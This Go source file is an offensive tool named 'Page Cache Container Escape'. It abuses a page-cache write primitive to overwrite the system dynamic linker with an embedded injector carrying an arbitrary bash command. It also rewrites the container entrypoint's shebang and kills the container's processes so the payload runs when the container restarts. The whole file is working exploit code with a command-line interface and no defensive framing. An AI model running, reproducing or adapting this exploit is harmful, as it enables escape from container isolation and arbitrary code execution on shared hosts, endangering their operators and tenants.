//go:build linux

package main

import (
	"bytes"
	"context"
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"

	"page-cache-container-escape/copyfail"
)

//go:embed injector-amd64.bin
var injectorBin []byte

const (
	payloadMarker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01"
	selfShebang   = "#!/proc/self/exe\n"
)

var linkerPaths = []string{
	"/lib64/ld-linux-x86-64.so.2",
	"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
}

// --- Copy Fail primitive ---

func pageCacheWrite(path string, offset int64, content []byte) error {
	return copyfail.Write(path, offset, content, copyfail.Write4)
}

// --- Patch injector with payload ---

func patchInjector(payload []byte) ([]byte, error) {
	if len(payload) == 0 || len(payload) > 4096 {
		return nil, fmt.Errorf("payload length %d out of range", len(payload))
	}
	marker := []byte(payloadMarker)
	offset := bytes.Index(injectorBin, marker)
	if offset < 0 {
		return nil, fmt.Errorf("payload marker not found in injector binary")
	}
	lenOff := offset + len(marker)
	bufOff := lenOff + 8

	patched := bytes.Clone(injectorBin)
	for i := range 8 {
		patched[lenOff+i] = byte(uint64(len(payload)) >> (8 * i))
	}
	copy(patched[bufOff:], make([]byte, 4096))
	copy(patched[bufOff:], payload)
	return patched, nil
}

// --- Write injector to ld.so ---

func writeInjector(payload []byte) error {
	injector, err := patchInjector(payload)
	if err != nil {
		return err
	}
	for _, target := range linkerPaths {
		info, err := os.Stat(target)
		if err != nil {
			continue
		}
		if int64(len(injector)) > info.Size() {
			return fmt.Errorf("injector (%d) exceeds %s size (%d)", len(injector), target, info.Size())
		}
		fmt.Printf("    [*] Target: %s (%d bytes -> %d bytes)\n", target, info.Size(), len(injector))
		if err := pageCacheWrite(target, 0, injector); err != nil {
			return err
		}
		return nil
	}
	return fmt.Errorf("no dynamic linker found")
}

// --- Write shebang to entrypoint ---

func writeEntrypoint(pid int) error {
	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	argv := bytes.Split(bytes.TrimRight(cmdline, "\x00"), []byte{0})
	path := "/bin/sh"
	if len(argv) > 0 && len(argv[0]) > 0 && filepath.IsAbs(string(argv[0])) {
		if resolved, err := filepath.EvalSymlinks(string(argv[0])); err == nil {
			path = resolved
		}
	}
	fmt.Printf("    [*] Target: %s -> %q\n", path, selfShebang)
	return pageCacheWrite(path, 0, []byte(selfShebang))
}

// --- Crash container ---

func crashContainer(ctx context.Context, pid int) error {
	// Method 1: cgroup.kill (cgroup v2)
	cgPath, err := os.ReadFile(fmt.Sprintf("/proc/%d/cgroup", pid))
	if err == nil {
		for _, line := range bytes.Split(cgPath, []byte("\n")) {
			if bytes.HasPrefix(line, []byte("0::")) {
				rel := string(bytes.TrimPrefix(line, []byte("0::")))
				killFile := filepath.Join("/sys/fs/cgroup", rel, "cgroup.kill")
				if os.WriteFile(killFile, []byte("1"), 0644) == nil {
					return nil // cgroup.kill will kill us too
				}
			}
		}
	}
	// Method 2: kill all processes then exit
	for i := 0; i < 10; i++ {
		syscall.Kill(-1, syscall.SIGKILL)
		time.Sleep(100 * time.Millisecond)
	}
	os.Exit(137)
	return nil
}

// --- Main exploit ---

func exploit(cmd string, pid int, timeout time.Duration) error {
	payload := []byte(fmt.Sprintf("#!/bin/bash\n%s\n", cmd))

	fmt.Println("")
	fmt.Println("[*] Page Cache Container Escape")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] PID: %d\n\n", pid)

	fmt.Println("[*] Step 1: Overwriting dynamic linker...")
	if err := writeInjector(payload); err != nil {
		return err
	}
	fmt.Println("[+] Step 1: Done\n")

	fmt.Println("[*] Step 2: Overwriting container entrypoint...")
	if err := writeEntrypoint(pid); err != nil {
		return err
	}
	fmt.Println("[+] Step 2: Done\n")

	fmt.Println("[*] Step 3: Triggering container crash...")
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	crashContainer(ctx, pid)
	fmt.Println("[+] Step 3: Done")
	return nil
}

// --- CLI ---

func main() {
	var (
		cmd       string
		pid       = 1
		noRestore = false
		timeout   = 30 * time.Second
	)

	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--cmd", "-c":
			i++
			if i < len(args) {
				cmd = args[i]
			}
		case "--no-restore":
			noRestore = true
		case "--pid":
			i++
			if i < len(args) {
				fmt.Sscanf(args[i], "%d", &pid)
			}
		case "--timeout":
			i++
			if i < len(args) {
				if d, err := time.ParseDuration(args[i]); err == nil {
					timeout = d
				}
			}
		case "--help", "-h":
			fmt.Fprintf(os.Stderr, "Usage: pcce --cmd <command> [--no-restore] [--pid N] [--timeout duration]\n")
			os.Exit(0)
		}
	}

	if cmd == "" {
		fmt.Fprintln(os.Stderr, "error: --cmd is required")
		os.Exit(2)
	}
	if !noRestore {
		cmd += "\necho 3 > /proc/sys/vm/drop_caches"
	}

	if err := exploit(cmd, pid, timeout); err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}
}
